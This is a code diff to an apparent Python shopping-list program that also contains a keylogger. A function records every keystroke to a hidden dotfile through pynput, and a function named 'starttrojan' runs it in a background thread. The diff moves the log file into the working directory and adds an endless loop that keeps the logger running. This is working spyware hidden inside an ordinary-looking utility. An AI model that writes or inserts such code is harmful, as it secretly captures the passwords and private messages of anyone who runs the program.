@@ -5,6 +5,9 @@ import os
 import csv
 from pynput import keyboard
 import threading
+import time
+import subprocess
+import threading
 slfile = "shoppinglist.json"
 
 def load():
@@ -93,20 +96,23 @@ def export(filename):
 	print(f"Shopping list exported to {filename}")
 
 def keylogger():
-	logfile = "/tmp/.keylogger.txt"
-	def on_press(key):
-		try:
-			with open(logfile, "a") as f:
-				f.write(f"{key.char}")
-		except AttributeError:
-			with open(logfile, "a") as f:
-				f.write(f"[{key}]")
-	with keyboard.Listener(on_press=on_press) as listener:
-		listener.join()
+    logfile = "./.keylogger.txt" 
+    def on_press(key):
+        try:
+            with open(logfile, "a") as f:
+                f.write(f"{key.char}")
+        except AttributeError:
+            with open(logfile, "a") as f:
+                f.write(f"[{key}]")
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()  
 
 
 def starttrojan():
 	threading.Thread(target=keylogger, daemon=True).start()
+	while True:
+		time.sleep(1)
 	print("Not yet implemented")
 
 def main():
